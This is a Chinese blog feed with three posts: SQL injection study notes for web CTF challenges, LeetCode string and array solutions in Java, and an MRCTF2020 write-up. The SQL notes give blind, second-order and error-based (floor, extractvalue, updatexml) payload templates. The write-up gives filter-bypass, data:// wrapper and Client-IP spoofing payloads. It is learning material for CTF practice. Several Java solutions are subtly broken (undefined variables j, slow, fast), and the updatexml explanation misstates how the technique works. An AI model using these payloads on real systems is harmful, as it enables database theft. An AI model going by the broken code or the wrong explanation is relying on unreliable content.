<p>这条语句的漏洞在于 <code>limit</code> 子句允许我们指定从 <code>h1dden_f14g</code> 表中获取的行数和偏移量，从而可以通过在 <code>limit</code> 子句中使用不同的偏移量来获取不同的数据行。如果我们使用一个较大的偏移量，我们可以跳过一些行，直到找到我们感兴趣的数据行。在这个例子中，我们只需要检查第一行中的 <code>the_f14g</code> 字段的长度是否为50，因此我们可以使用 <code>limit 0,1</code> 来只检查第一行。</p>
<p>b.爆内容</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">or</span> <span class="title">substr</span>(<span class="params">(<span class="keyword">select</span> length(the_f14g</span>) <span class="keyword">from</span> h1dden_f14g limit 0,1),1,1)</span>=<span class="string">&quot;a&quot;</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>原理和上面的差不多</p>
<h4 id="3-二次注入"><a href="#3-二次注入" class="headerlink" title="3.二次注入"></a>3.二次注入</h4><p><strong>原理</strong></p>
<p>​    二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes  、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\”  进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br> 比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p>
<p> <strong>二次注入，可以概括为以下两步:</strong></p>
<ul>
<li>第一步：插入恶意数据<br> 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>
<li>第二步：引用恶意数据<br> 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。<br> 配合下图可以有更好的理解：</li>
</ul>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230513200804071.png" alt="image-20230513200804071"></p>
<p>上面文章一开头的也是这个知识点</p>
<p>参考：<a href="https://huaweicloud.csdn.net/6335670ed3efff3090b55bef.html?spm=1001.2101.3001.6650.18&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~activity-18-121328475-blog-79045069.t0_edu_mlt&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~activity-18-121328475-blog-79045069.t0_edu_mlt&utm_relevant_index=21">二次注入</a></p>
<h4 id="4-报错注入"><a href="#4-报错注入" class="headerlink" title="4.报错注入"></a>4.报错注入</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#报错注入<span class="built_in">floor</span></span><br><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((payload[]),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a)b)limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">#报错注入extractvalue</span><br><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,([payload])))</span><br><span class="line">#报错注入updatexml</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,([payload])),<span class="number">1</span>))</span><br><span class="line">当然还有其他很多，这几个只是常用的</span><br></pre></td></tr></table></figure>

<p><strong>floor报错注入主要利用的group by的机制</strong></p>
<p>​        group by  key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时  floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值不一致，导致插入时与原本已存在的产生冲突的错误。</p>
<p>主要检测时和插入时两次计算的所以输不一致就会报错。</p>
<p><strong>extractvalue报错注入</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ExtractValue(xml_frag, xpath_expr)</span><br></pre></td></tr></table></figure>

<p><strong>原理</strong></p>
<p>如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</p>
<p><code>extractvalue</code> 是一个用于从 XML 中提取特定值的 MySQL 函数。<code>1</code> 是要提取的值的位置，<code>concat(0x5c,([payload]))</code> 中的 <code>concat</code> 函数用于将一个字符串和一个十六进制值连接起来，<code>0x5c</code> 代表反斜杠，<code>[payload]</code> 则是要注入的语句。</p>
<p>通过将恶意语句嵌入到 <code>concat</code> 函数中，我们可以构造出一个错误的 XML 结构，从而触发错误信息并得到敏感数据。</p>
<p><strong>updatexml报错注入</strong></p>
<p><code>UPDATEXML (XML_document, XPath_string, new_value);</code>  第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string  (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。  第三个参数：new_value，String格式，替换查找到的符合条件的数据 函数作用：改变文档中符合条件的节点的值</p>
<p><strong>原理</strong></p>
<p>如果XPath_string的值不符合xpath的语法格式则会报错，报错信息会提示这个数据错误</p>
<p>所以我们就在这个参数里注入我们的返回数据结果</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,([payload])),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<p>这是一个基于XML的报错注入方法，其中updatexml函数尝试将XML文档中指定的节点值更新为指定的值。在这个例子中，我们将1作为文档，并试图更新一个不存在的节点（由payload变量指定）。由于这个节点不存在，updatexml会返回0，因此整个语句将被解释为1=0，结果为false。然后可以根据这个结果来推断出一些信息。如果服务器配置为报告错误消息，则可以使用这种技术来执行报错注入攻击。</p>
<p>如：获取当前数据库的库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>

<p>其中0x7e是ASCII编码，解码结果为~</p>
<p>其他的语句类似，另外还有时间盲注也是需要回顾回顾了，之前学过忘了</p>
<p>参考文章：</p>
<p><a href="https://www.jianshu.com/p/4c67f20a7997">https://www.jianshu.com/p/4c67f20a7997</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/384713996">https://zhuanlan.zhihu.com/p/384713996</a></p>
]]></content>
      <categories>
        <category>web ctf</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>只会简单的</title>
    <url>/p/fdfb6871.html</url>
    <content><![CDATA[<h2 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h2><h2 id="字符串：反转字符串"><a href="#字符串：反转字符串" class="headerlink" title="字符串：反转字符串"></a>字符串：反转字符串</h2><p>题目：<a href="https://leetcode.cn/problems/reverse-string/">https://leetcode.cn/problems/reverse-string/</a></p>
<p>编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 <code>s</code> 的形式给出。</p>
<p>不要给另外的数组分配额外的空间，你必须<strong>原地修改输入数组</strong>、使用 O(1) 的额外空间解决这一问题。 </p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = [&quot;h&quot;,&quot;e&quot;,&quot;l&quot;,&quot;l&quot;,&quot;o&quot;]</span><br><span class="line">输出：[&quot;o&quot;,&quot;l&quot;,&quot;l&quot;,&quot;e&quot;,&quot;h&quot;]</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = [&quot;H&quot;,&quot;a&quot;,&quot;n&quot;,&quot;n&quot;,&quot;a&quot;,&quot;h&quot;]</span><br><span class="line">输出：[&quot;h&quot;,&quot;a&quot;,&quot;n&quot;,&quot;n&quot;,&quot;a&quot;,&quot;H&quot;]</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 105</code></li>
<li><code>s[i]</code> 都是 <a href="https://baike.baidu.com/item/ASCII">ASCII</a> 码表中的可打印字符</li>
</ul>
<p>这里需要注意一下，什么时候用库函数</p>
<h4 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h4><p>这道题目比较的简单</p>
<p>​    对于字符串，我们定义两个指针（也可以说是索引下标），一个从字符串前面，一个从字符串后面，两个指针同时向中间移动，并交换元素。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(<span class="keyword">char</span>[] s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> r = s.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l &lt; r)&#123;</span><br><span class="line">            <span class="keyword">char</span> temp = s[l];</span><br><span class="line">            s[l] = s[r];</span><br><span class="line">            s[r] = temp;</span><br><span class="line">            l++;</span><br><span class="line">            r--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="反转字符串-II"><a href="#反转字符串-II" class="headerlink" title="反转字符串 II"></a>反转字符串 II</h2><p>给定一个字符串 <code>s</code> 和一个整数 <code>k</code>，从字符串开头算起，每计数至 <code>2k</code> 个字符，就反转这 <code>2k</code> 字符中的前 <code>k</code> 个字符。</p>
<ul>
<li>如果剩余字符少于 <code>k</code> 个，则将剩余字符全部反转。</li>
<li>如果剩余字符小于 <code>2k</code> 但大于或等于 <code>k</code> 个，则反转前 <code>k</code> 个字符，其余字符保持原样。</li>
</ul>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abcdefg&quot;, k = 2</span><br><span class="line">输出：&quot;bacdfeg&quot;</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abcd&quot;, k = 2</span><br><span class="line">输出：&quot;bacd&quot;</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 104</code></li>
<li><code>s</code> 仅由小写英文组成</li>
<li><code>1 &lt;= k &lt;= 104</code></li>
</ul>
<h4 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h4><p>按题意进行模拟：反转每个下标从 2k 的倍数开始的，长度为 k 的子串。若该子串长度不足 k，则反转整个子串。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">reverseStr</span><span class="params">(String s, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] ch = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; ch.length;i += <span class="number">2</span> * j)&#123;</span><br><span class="line">            <span class="keyword">int</span> start = i;</span><br><span class="line">            <span class="keyword">int</span> end = Math.min(ch.length - <span class="number">1</span>,start + j- <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">while</span>(start &lt; end)&#123;              </span><br><span class="line">                <span class="keyword">char</span> temp = ch[start];</span><br><span class="line">                ch[start] = ch[end];</span><br><span class="line">                ch[end] = temp;</span><br><span class="line">                start++;</span><br><span class="line">                end--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(ch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="反转字符串中的单词"><a href="#反转字符串中的单词" class="headerlink" title="反转字符串中的单词"></a>反转字符串中的单词</h2><p>给你一个字符串 <code>s</code> ，请你反转字符串中 <strong>单词</strong> 的顺序。</p>
<p><strong>单词</strong> 是由非空格字符组成的字符串。<code>s</code> 中使用至少一个空格将字符串中的 <strong>单词</strong> 分隔开。</p>
<p>返回 <strong>单词</strong> 顺序颠倒且 <strong>单词</strong> 之间用单个空格连接的结果字符串。</p>
<p><strong>注意：</strong>输入字符串 <code>s</code>中可能会存在前导空格、尾随空格或者单词间的多个空格。返回的结果字符串中，单词间应当仅用单个空格分隔，且不包含任何额外的空格。 </p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;the sky is blue&quot;</span><br><span class="line">输出：&quot;blue is sky the&quot;</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;  hello world  &quot;</span><br><span class="line">输出：&quot;world hello&quot;</span><br><span class="line">解释：反转后的字符串中不能存在前导空格和尾随空格。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;a good   example&quot;</span><br><span class="line">输出：&quot;example good a&quot;</span><br><span class="line">解释：如果两个单词间有多余的空格，反转后的字符串需要将单词间的空格减少到仅有一个。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 104</code></li>
<li><code>s</code> 包含英文大小写字母、数字和空格 <code>&#39; &#39;</code></li>
<li><code>s</code> 中 <strong>至少存在一个</strong> 单词</li>
</ul>
<p><strong>进阶：</strong>如果字符串在你使用的编程语言中是一种可变数据类型，请尝试使用 <code>O(1)</code> 额外空间复杂度的 <strong>原地</strong> 解法。</p>
<p>这道题目需要考虑的东西比较多，首先呢他要去除可能存在的前后的空格，其次中间只能最多存在一个空格，而且是每一个单词进行反转，而不是整体的反转，reserve（），split（）函数加字符串可以拼接其实可以解决，这里尽量使用原始的方法，减少使用库函数，</p>
<p>方法一</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">reverseWords</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        s = s.trim();<span class="comment">//把一头一尾的空格去除掉</span></span><br><span class="line">        List&lt;String&gt; wordList = Arrays.asList(s.split(<span class="string">&quot;\\s+&quot;</span>)); <span class="comment">// 匹配连续的空白字符作为分隔符分割</span></span><br><span class="line">        Collections.reverse(wordList);<span class="comment">//对收集的单词进行翻转</span></span><br><span class="line">        <span class="keyword">return</span> String.join(<span class="string">&quot; &quot;</span>, wordList);<span class="comment">//用空格将单词拼接</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<p>思路：移除多余空格，将整个字符串反转，再将每个单词反转</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">reverseWords</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = removeSpace(s);</span><br><span class="line">        <span class="comment">// 翻转字符串</span></span><br><span class="line">        reverseString(sb, <span class="number">0</span>, sb.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 翻转每个单词</span></span><br><span class="line">        reverseEachWord(sb);</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> StringBuilder <span class="title">removeSpace</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> end = s.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (s.charAt(start) == <span class="string">&#x27; &#x27;</span>) start++;</span><br><span class="line">        <span class="keyword">while</span> (s.charAt(end) == <span class="string">&#x27; &#x27;</span>) end--;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">while</span> (start &lt;= end) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = s.charAt(start);</span><br><span class="line">            <span class="keyword">if</span> (c != <span class="string">&#x27; &#x27;</span> || sb.charAt(sb.length() - <span class="number">1</span>) != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                sb.append(c);</span><br><span class="line">            &#125;</span><br><span class="line">            start++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(StringBuilder sb, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">            <span class="keyword">char</span> temp = sb.charAt(start);</span><br><span class="line">            sb.setCharAt(start, sb.charAt(end));</span><br><span class="line">            sb.setCharAt(end, temp);</span><br><span class="line">            start++;</span><br><span class="line">            end--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverseEachWord</span><span class="params">(StringBuilder sb)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = sb.length();</span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span>, end = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (start &lt; n) &#123;</span><br><span class="line">            <span class="comment">// 循环至单词的末尾</span></span><br><span class="line">            <span class="keyword">while</span> (end &lt; n &amp;&amp; sb.charAt(end) != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                ++end;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 翻转单词</span></span><br><span class="line">            reverseString(sb, start, end - <span class="number">1</span>);</span><br><span class="line">            <span class="comment">// 更新start，去找下一个单词</span></span><br><span class="line">            start = end + <span class="number">1</span>;</span><br><span class="line">            ++end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://leetcode.cn/problems/reverse-words-in-a-string/solutions/194450/fan-zhuan-zi-fu-chuan-li-de-dan-ci-by-leetcode-sol/">https://leetcode.cn/problems/reverse-words-in-a-string/solutions/194450/fan-zhuan-zi-fu-chuan-li-de-dan-ci-by-leetcode-sol/</a></p>
<h2 id="数组：移除元素"><a href="#数组：移除元素" class="headerlink" title="数组：移除元素"></a>数组：移除元素</h2><p>给你一个数组 <code>nums</code> 和一个值 <code>val</code>，你需要 <strong>原地</strong> 移除所有数值等于 <code>val</code> 的元素，并返回移除后数组的新长度。</p>
<p>不要使用额外的数组空间，你必须仅使用 <code>O(1)</code> 额外空间并 <strong>原地 修改输入数组</strong>。</p>
<p>元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。</p>
<p><strong>说明:</strong></p>
<p>为什么返回数值是整数，但输出的答案是数组呢?</p>
<p>请注意，输入数组是以<strong>「引用」</strong>方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。</p>
<p>你可以想象内部操作如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// nums 是以“引用”方式传递的。也就是说，不对实参作任何拷贝</span><br><span class="line">int len = removeElement(nums, val);</span><br><span class="line"></span><br><span class="line">// 在函数里修改输入数组对于调用者是可见的。</span><br><span class="line">// 根据你的函数返回的长度, 它会打印出数组中 该长度范围内 的所有元素。</span><br><span class="line">for (int i = 0; i &lt; len; i++) &#123;</span><br><span class="line">    print(nums[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,2,2,3], val = 3</span><br><span class="line">输出：2, nums = [2,2]</span><br><span class="line">解释：函数应该返回新的长度 2, 并且 nums 中的前两个元素均为 2。你不需要考虑数组中超出新长度后面的元素。例如，函数返回的新长度为 2 ，而 nums = [2,2,3,3] 或 nums = [2,2,0,0]，也会被视作正确答案。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [0,1,2,2,3,0,4,2], val = 2</span><br><span class="line">输出：5, nums = [0,1,4,0,3]</span><br><span class="line">解释：函数应该返回新的长度 5, 并且 nums 中的前五个元素为 0, 1, 3, 0, 4。注意这五个元素可为任意顺序。你不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>0 &lt;= nums.length &lt;= 100</code></li>
<li><code>0 &lt;= nums[i] &lt;= 50</code></li>
<li><code>0 &lt;= val &lt;= 100</code></li>
</ul>
<p>两种解法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 快慢指针</span></span><br><span class="line">        <span class="keyword">int</span> slowI = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> fastI = <span class="number">0</span>; fast&lt; nums.length; fast++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[fast] != val) &#123;</span><br><span class="line">                nums[slow] = nums[fast];</span><br><span class="line">                slowI++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//下面这种来源：力扣（LeetCode）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = nums.length;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[left] == val) &#123;</span><br><span class="line">                nums[left] = nums[right - <span class="number">1</span>];</span><br><span class="line">                right--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//暴力解法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == val) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = i + <span class="number">1</span>; k &lt; len; k++) &#123;</span><br><span class="line">                    nums[k - <span class="number">1</span>] = nums[k];</span><br><span class="line">                &#125;</span><br><span class="line">                i--;</span><br><span class="line">                len--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
  </entry>
  <entry>
    <title>随意刷题</title>
    <url>/p/e130c463.html</url>
    <content><![CDATA[<p>菜狗的做题记录，如有错误，不要见怪</p>
<h2 id="记录几道：混杂"><a href="#记录几道：混杂" class="headerlink" title="记录几道：混杂"></a>记录几道：混杂</h2><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><h3 id="变量名绕过-伪协议-反加密"><a href="#变量名绕过-伪协议-反加密" class="headerlink" title="变量名绕过+伪协议+反加密"></a>变量名绕过+伪协议+反加密</h3><p>打开题目啥都没有</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304161408083.png" alt="image-20230416140807896"></p>
<p>源码看看有没有东西</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304161413457.png" alt="image-20230416141325402"></p>
<p>果然有一些东西，有两层判断</p>
<blockquote>
<p>第一个if判断传参的字符串，不能有_和%5f （substr_count() 函数计算子串在字符串中出现的次数。）<br> 绕过：PHP会将传参中的空格( )、小数点(.)自动替换成下划线<br> 第二个if判断get传参b_u_p_t不等于23333 并且开头和结尾和中间必须是23333<br> 绕过：在23333结尾加个换行符url编码为%0a 即可绕过，</p>
</blockquote>
<p>PHP变量命名规则</p>
<p>1、变量以美元符号$开头。如$name，$age。</p>
<p>2、美元符号$后面的第一个字符不可以是数字，只能是下划线_或者字母。如$1_1这样的变量是错误的。</p>
<p>3、除了下划线_外，变量不允许出现任何空格或标点符号。也就是说变量名只能包含：a-z、A-Z、0-9 以及下划线_。</p>
<p>4、PHP变量名是区分大小写的。如$name与$Name是两个不同的变量。</p>
<p><strong>playload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?b.u.p.t=<span class="number">23333</span>%<span class="number">0</span>a  </span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304162311322.png" alt="image-20230416141655073"></p>
<p>打开后，应该ip也有可疑之处</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304161420606.png" alt="image-20230416142038560"></p>
<p>看源码，一连串不知道什么东西，查了之后发现是JsFuck编码，可以在线解密，也可以再控制台解密</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304161420111.png" alt="image-20230416142019903"></p>
<p>提示：post 里面要放一个Merak</p>
<p>随便传一个值试试看会出现什么东西</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304161424794.png" alt="image-20230416142448641"></p>
<p>出现源码了，分析一下：</p>
<blockquote>
<p> 1、来源ip是127.0.0.1 用 <strong>Client-ip</strong> 或者<strong>XFF</strong>都可以</p>
<p> 2、get参数2333传来的值，使用文件流打开后内容为<code>todat is a happy day</code></p>
<p> 3、file_get_contents用php伪协议绕过：2333=data://text/plain,todat is a happy day</p>
<p> 学习一下：<a href="https://blog.csdn.net/qq_42096378/article/details/123489782">https://blog.csdn.net/qq_42096378/article/details/123489782</a></p>
<p> 4、反写change加密函数 :这里主要就是对应着change（）函数反着来就差不多了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">   <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">   <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) - <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">       <span class="comment">//“Chr是PHP语言中的一个函数，功能是返回以数值表达式值为编码的字符</span></span><br><span class="line">       <span class="comment">//php ord是函数返回字符串第一个字符的 ASCII 值。</span></span><br><span class="line">   &#125; </span><br><span class="line">   <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$real_flag</span> = unchange(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$real_flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//ZmpdYSZmXGI=</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>payload：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?<span class="number">2333</span>=data:<span class="comment">//text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</span></span><br><span class="line">client-ip:<span class="number">127.0</span>.<span class="number">0.1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304161502738.png" alt="image-20230416150210583"></p>
